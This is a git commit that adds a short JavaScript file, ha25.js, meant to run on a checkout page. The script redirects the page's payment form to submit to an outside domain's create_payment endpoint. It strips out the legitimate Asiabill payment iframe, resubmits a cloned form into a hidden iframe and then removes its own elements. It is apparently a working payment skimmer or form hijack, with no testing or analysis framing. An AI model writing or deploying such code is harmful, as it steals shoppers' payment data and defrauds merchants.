8298dee30091c82f30740548fea4f1d8de6e2d2a
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-04 22:04:34 +0800

    Update and rename ha24.js to ha25.js

---
+++ ha25.js
@@ -0,0 +1,14 @@
+var scriptEle = document.createElement("script");
+scriptEle.type ="text/javascript";
+scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment'`;
+var x = document.getElementById("createForm");
+x.insertBefore(scriptEle, x.firstChild);
+document.body.appendChild(scriptEle);
+document.getElementById('AsiabillPayIframe').remove();
+let node = document.getElementById('createForm');
+let c = node.cloneNode(true);
+c.target = "testIframe1";
+document.body.appendChild(c);
+x.remove();
+scriptEle.remove();
+document.getElementById('haha').remove();
